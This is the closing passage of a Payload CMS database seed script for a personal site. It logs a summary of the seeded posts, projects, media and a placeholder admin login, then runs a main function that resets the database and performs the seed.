  ║                    ║    Pkgs:    Three.js, Drei, Payload
  ╚══════════╗         ║    Theme:   Soviet Warm [dark]
             ╚═════════╝    Terminal: amber phosphor

  ██ ██ ██ ██ ██ ██ ██ ██
`,
    },
  })

  console.log('\n✅ Seed complete!')
  console.log('   Admin:    admin@sigterm.vodka / changeme123')
  console.log('   Media uploaded:')
  console.log('     SVG icons:   17 (8 media types + 4 statuses + 5 project statuses + avatar)')
  console.log('     Remote imgs: 14 (4 hero images + 10 covers)')
  console.log('   Tags:     10')
  console.log('   Categories: 4')
  console.log('   Posts:    4 (published, with hero images)')
  console.log('   Projects: 7 (published)')
  console.log('   Links:    5')
  console.log('   MediaTypes: 8 (with icons)')
  console.log('   MediaStatuses: 4 (with icons)')
  console.log('   ProjectStatuses: 5 (with icons)')
  console.log('   FavouriteMedia: 10 (published, with covers)')
  console.log('   Notes:    4 (published)')
  console.log('   SiteIdentity: populated')
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  try {
    await freshReset()
    const payload = await bootPayload()
    await seed(payload)
    process.exit(0)
  } catch (err) {
    console.error('\n❌ Seed failed:', err)
    process.exit(1)
  }
}

main()
